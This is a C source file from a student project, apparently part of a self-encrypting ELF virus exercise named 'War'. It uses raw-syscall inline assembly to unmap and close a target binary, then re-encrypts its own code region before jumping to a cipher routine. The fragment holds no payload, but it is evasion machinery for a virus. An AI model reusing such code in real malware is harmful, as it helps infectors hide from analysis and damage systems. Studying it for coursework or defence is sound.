/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   release.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/12 18:22:50 by ddinaut           #+#    #+#             */
/*   Updated: 2019/03/22 14:52:03 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

__INLINE__ static int     _munmap(void *addr, size_t len)
{
	long ret;

	__asm__ __volatile__ (
		"mov rdi, %0;"
		"mov rsi, %1;"
		"mov rax, 11;"
		"syscall" :: "g"(addr), "g"(len)
		);
	__asm__ __volatile__ (
		"mov %0, rax" : "=r"(ret)
		);

	return (ret);
}

__INLINE__ static int _close(int fd)
{
	long ret;

	__asm__ __volatile__ (
		"mov edi, %0;"
		"mov rax, 3;"
		"syscall" :: "g"(fd)
		);
	__asm__ __volatile__ (
		"mov %0, rax" : "=r"(ret)
		);

	return ((int)ret);
}

void		release(t_data *data)
{
//	revert_one(&data->key, (char*)inject, (size_t)release - (size_t)inject);
	update_one(&data->key, (char*)release, (size_t)cypher_end - (size_t)release);

	if (data->context == true || data->context == false)
	{
		_close(data->bin.fd);
		_munmap(data->bin.map, data->bin.size);
	}

//	revert_one(&data->key, (char*)cypher_end, (size_t)end - (size_t)release);
	cypher_end(data);
}
